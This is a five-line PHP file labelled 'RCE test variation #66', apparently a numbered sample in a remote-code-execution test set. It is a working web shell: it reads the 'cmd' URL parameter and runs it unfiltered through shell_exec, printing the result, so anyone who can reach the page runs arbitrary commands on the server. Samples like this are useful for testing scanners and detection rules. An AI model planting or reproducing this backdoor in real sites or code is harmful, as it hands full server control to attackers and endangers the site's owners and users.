<?php
// RCE test variation #66
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>